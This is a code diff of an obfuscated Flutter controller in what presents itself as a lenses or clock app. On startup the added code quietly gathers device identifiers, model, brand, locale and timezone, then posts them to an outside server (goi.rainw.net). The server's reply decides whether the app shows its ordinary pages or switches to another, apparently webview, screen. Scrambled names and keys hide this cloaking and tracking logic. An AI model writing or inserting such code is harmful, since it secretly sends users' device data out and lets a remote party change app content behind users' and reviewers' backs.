@@ -12,155 +12,162 @@ import 'package:internet_connection_checker/internet_connection_checker.dart';
 
 class LensesCreateLogic extends GetxController {
 
-  var qlckxovej = RxBool(false);
-  var sijvmflrh = RxBool(true);
-  var iqhyklu = RxString("");
-  var remington = RxBool(false);
-  var keeling = RxBool(true);
-  final sbaetqnmvf = Dio();
+  var jkiyehxbd = RxBool(false);
+  var oefwpnjlb = RxBool(true);
+  var jrigvlh = RxString("");
+  var dusty = RxBool(false);
+  var turner = RxBool(true);
+  final aitezuj = Dio();
 
 
   InAppWebViewController? webViewController;
 
-  dynamic irabnhd(){
-    final hqwyrsgix = InternetConnectionChecker.instance;
-    final gxkyjhr = hqwyrsgix.onStatusChange.skip(1).listen(
-          (InternetConnectionStatus qyguwvix) {
-        if (qyguwvix == InternetConnectionStatus.connected) {
-          brnyj();
+  dynamic dcaenh(){
+    final zisuhmw = InternetConnectionChecker.instance;
+    final nmpaogyic = zisuhmw.onStatusChange.skip(1).listen(
+          (InternetConnectionStatus rgkixzdbqa) {
+        if (rgkixzdbqa == InternetConnectionStatus.connected) {
+          sjwz();
         } else {
-          Get.toNamed('/Apptimeout')?.then((_){
-            brnyj();
+          Get.toNamed('/lensesErrorPage')?.then((_){
+            sjwz();
           });
         }
       },
     );
-    return gxkyjhr;
+    return nmpaogyic;
   }
 
-  Future<bool> kbtzyo() async {
-    var oetkzqjmyn = await NetworkUtils.isNetworkAvailable();
-    if(!oetkzqjmyn){
-      Get.toNamed('/Apptimeout')?.then((_){
-        brnyj();
+  Future<bool> uxpdftsay() async {
+    var wsheygu = await InternetConnectionChecker.instance.hasConnection;
+    if(!wsheygu){
+      Get.toNamed('/lensesErrorPage')?.then((_){
+        sjwz();
       });
     }
-    return oetkzqjmyn;
+    return wsheygu;
   }
 
   @override
   void onInit() {
     super.onInit();
-    irabnhd();
-    brnyj();
+    dcaenh();
+    sjwz();
   }
 
 
-  Future<void> brnyj() async {
+  Future<void> sjwz() async {
 
-    var keoagsn = await kbtzyo();
-    if(!keoagsn){
+    var zibxkcdoum = await uxpdftsay();
+    if(!zibxkcdoum){
       return;
     }
 
-    remington.value = true;
-    keeling.value = true;
-    sijvmflrh.value = false;
+    dusty.value = true;
+    turner.value = true;
+    oefwpnjlb.value = false;
 
-    sbaetqnmvf.post("https://ds.h3r3zian.club/VVLHX8DW1I?no_check",data: await lyvqij()).then((value) {
-      var ogexs = value.data["ogexs"] as String;
-      var qchkavul = value.data["qchkavul"] as bool;
-      if (qchkavul) {
-        iqhyklu.value = ogexs;
-        wilmer();
+    aitezuj.post("https://goi.rainw.net/jbdrmelyntsozqg",data: await qvpzikd()).then((value) {
+      var xzknyv = value.data["xzknyv"] as String;
+      var uqjb = value.data["uqjb"] as bool;
+      if (uqjb) {
+        jrigvlh.value = xzknyv;
+        osbaldo();
       } else {
-        boehm();
+        runte();
       }
     }).catchError((e) {
-      sijvmflrh.value = true;
-      keeling.value = true;
-      remington.value = false;
+      oefwpnjlb.value = true;
+      turner.value = true;
+      dusty.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> lyvqij() async {
-    final DeviceInfoPlugin deuoapn = DeviceInfoPlugin();
-    PackageInfo sflboeu_mogbnpy = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> qvpzikd() async {
+    final DeviceInfoPlugin kmxwl = DeviceInfoPlugin();
+    PackageInfo xfkerlm_elfdmb = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var biwk = Platform.localeName;
-    var tix_xcuG = currentTimeZone;
+    var plbintc = Platform.localeName;
+    var byusglp = currentTimeZone;
 
-    var tix_Vd = sflboeu_mogbnpy.packageName;
-    var tix_qW = sflboeu_mogbnpy.version;
-    var tix_YP = sflboeu_mogbnpy.buildNumber;
+    var zevrngdq = xfkerlm_elfdmb.packageName;
+    var ibpjnme = xfkerlm_elfdmb.version;
+    var yxaqswie = xfkerlm_elfdmb.buildNumber;
 
-    var tix_tdRsKWrO = sflboeu_mogbnpy.appName;
-    var tix_uNEOySVA = "";
-    var tix_hMEtAou  = "";
-    var tix_Bn = "";
-    var elodyNolan = "";
-    var elsaSimonis = "";
-    var darbyStrosin = "";
-    var marcBergstrom = "";
+    var kmjscnil = xfkerlm_elfdmb.appName;
+    var tgpdkxqy = "";
+    var wqpj  = "";
+    var jwrgoa = "";
+    var ervinFlatley = "";
+    var aniyahSkiles = "";
+    var ivoryHyatt = "";
+    var adamMayer = "";
+    var elvieHoeger = "";
+    var zoeyRoberts = "";
 
 
-    var tix_IktUaYHG = "";
-    var tix_TurjYqUf = false;
+    var dhqkpjr = "";
+    var tiaraPagac = "";
+    var shawnHalvorson = "";
+    var wlxvgcm = false;
 
     if (GetPlatform.isAndroid) {
-      tix_IktUaYHG = "android";
-      var zdiocwtxau = await deuoapn.androidInfo;
+      dhqkpjr = "android";
+      var jemqptc = await kmxwl.androidInfo;
 
-      tix_Bn = zdiocwtxau.brand;
+      jwrgoa = jemqptc.brand;
 
-      tix_uNEOySVA  = zdiocwtxau.model;
-      tix_hMEtAou = zdiocwtxau.id;
+      tgpdkxqy  = jemqptc.model;
+      wqpj = jemqptc.id;
 
-      tix_TurjYqUf = zdiocwtxau.isPhysicalDevice;
+      wlxvgcm = jemqptc.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
-      tix_IktUaYHG = "ios";
-      var cialfh = await deuoapn.iosInfo;
-      tix_Bn = cialfh.name;
-      tix_uNEOySVA = cialfh.model;
+      dhqkpjr = "ios";
+      var aeivmp = await kmxwl.iosInfo;
+      jwrgoa = aeivmp.name;
+      tgpdkxqy = aeivmp.model;
 
-      tix_hMEtAou = cialfh.identifierForVendor ?? "";
-      tix_TurjYqUf  = cialfh.isPhysicalDevice;
+      wqpj = aeivmp.identifierForVendor ?? "";
+      wlxvgcm  = aeivmp.isPhysicalDevice;
     }
-
     var res = {
-      "tix_tdRsKWrO": tix_tdRsKWrO,
-      "tix_YP": tix_YP,
-      "tix_qW": tix_qW,
-      "tix_Vd": tix_Vd,
-      "tix_uNEOySVA": tix_uNEOySVA,
-      "tix_xcuG": tix_xcuG,
-      "tix_Bn": tix_Bn,
-      "tix_hMEtAou": tix_hMEtAou,
-      "biwk": biwk,
-      "tix_IktUaYHG": tix_IktUaYHG,
-      "tix_TurjYqUf": tix_TurjYqUf,
-      "elodyNolan" : elodyNolan,
-      "elsaSimonis" : elsaSimonis,
-      "darbyStrosin" : darbyStrosin,
-      "marcBergstrom" : marcBergstrom,
-
+      "kmjscnil": kmjscnil,
+      "ibpjnme": ibpjnme,
+      "aniyahSkiles" : aniyahSkiles,
+      "tgpdkxqy": tgpdkxqy,
+      "tiaraPagac" : tiaraPagac,
+      "byusglp": byusglp,
+      "jwrgoa": jwrgoa,
+      "shawnHalvorson" : shawnHalvorson,
+      "wqpj": wqpj,
+      "plbintc": plbintc,
+      "dhqkpjr": dhqkpjr,
+      "wlxvgcm": wlxvgcm,
+      "ervinFlatley" : ervinFlatley,
+      "ivoryHyatt" : ivoryHyatt,
+      "adamMayer" : adamMayer,
+      "zevrngdq": zevrngdq,
+      "elvieHoeger" : elvieHoeger,
+      "zoeyRoberts" : zoeyRoberts,
+      "yxaqswie": yxaqswie,
     };
     return res;
   }
 
-  Future<void> boehm() async {
-    Get.offAllNamed("/ClockMainPage");
+  Future<void> runte() async {
+    Get.offNamed("/lensesTabPage");
   }
 
-  Future<void> wilmer() async {
-    Get.offAllNamed("/Outreload");
+  Future<void> osbaldo() async {
+    Get.offNamed("/lensesStartPage");
   }
 
   @override
   void dispose() {
-    irabnhd().cancel();
+    dcaenh().cancel();
     super.dispose();
   }
+
 }
